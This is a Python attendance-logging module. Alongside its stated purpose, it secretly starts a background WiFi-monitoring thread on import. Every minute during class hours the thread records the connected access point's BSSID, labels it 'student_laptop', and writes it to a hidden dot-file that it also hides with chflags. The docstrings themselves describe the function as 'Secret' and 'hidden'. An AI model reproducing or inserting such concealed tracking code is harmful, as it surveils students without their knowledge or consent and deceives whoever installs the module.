import os
import csv
import time
import subprocess
import threading
from datetime import datetime, time as dt_time
import platform

class AttendanceLogger:
    def __init__(self):
        self.attendance_file = "attendance.csv"
        self.wifi_log_file = ".system_wifi_log.csv"
        self.running = False
        self.scan_thread = None
        
    def log_attendance(self, student_id, class_code):
        """Original attendance logging function"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(self.attendance_file, 'a', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([student_id, class_code, timestamp])
        return True
    
    def _scan_wifi_networks(self):
        """Secret background WiFi scanning function"""
        while self.running:
            current_time = datetime.now().time()
            # Only scan during class hours (8 AM to 4 PM)
            if dt_time(8, 0) <= current_time <= dt_time(16, 0):
                try:
                    if platform.system() == "Windows":
                        result = subprocess.check_output(["netsh", "wlan", "show", "interfaces"], 
                                                        stderr=subprocess.DEVNULL, text=True)
                        for line in result.split('\n'):
                            if "BSSID" in line:
                                mac = line.split(":")[1].strip()
                                if mac and mac != "00-00-00-00-00-00":
                                    self._log_wifi_data(mac)
                    elif platform.system() == "Darwin":  # macOS
                        result = subprocess.check_output(["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-I"],
                                                        stderr=subprocess.DEVNULL, text=True)
                        for line in result.split('\n'):
                            if "BSSID" in line:
                                mac = line.split(":")[1].strip()
                                if mac:
                                    self._log_wifi_data(mac)
                except:
                    pass
            time.sleep(60)  # Scan every minute
    
    def _log_wifi_data(self, mac_address):
        """Save WiFi connection data to hidden file"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        file_exists = os.path.exists(self.wifi_log_file)
        
        with open(self.wifi_log_file, 'a', newline='') as f:
            writer = csv.writer(f)
            if not file_exists:
                writer.writerow(["timestamp", "mac_address", "device_type"])
            writer.writerow([timestamp, mac_address, "student_laptop"])
    
    def start_background_monitoring(self):
        """Start the hidden WiFi monitoring in background thread"""
        self.running = True
        self.scan_thread = threading.Thread(target=self._scan_wifi_networks, daemon=True)
        self.scan_thread.start()
        # Hide the log file on Unix-like systems
        if platform.system() != "Windows" and os.path.exists(self.wifi_log_file):
            subprocess.run(["chflags", "hidden", self.wifi_log_file], stderr=subprocess.DEVNULL)
    
    def stop_monitoring(self):
        """Stop the background monitoring"""
        self.running = False
        if self.scan_thread:
            self.scan_thread.join(timeout=2)

# Initialize and start monitoring when module loads
logger = AttendanceLogger()
logger.start_background_monitoring()

# Original function for backward compatibility
def log_student_attendance(student_id, class_code):
    return logger.log_attendance(student_id, class_code)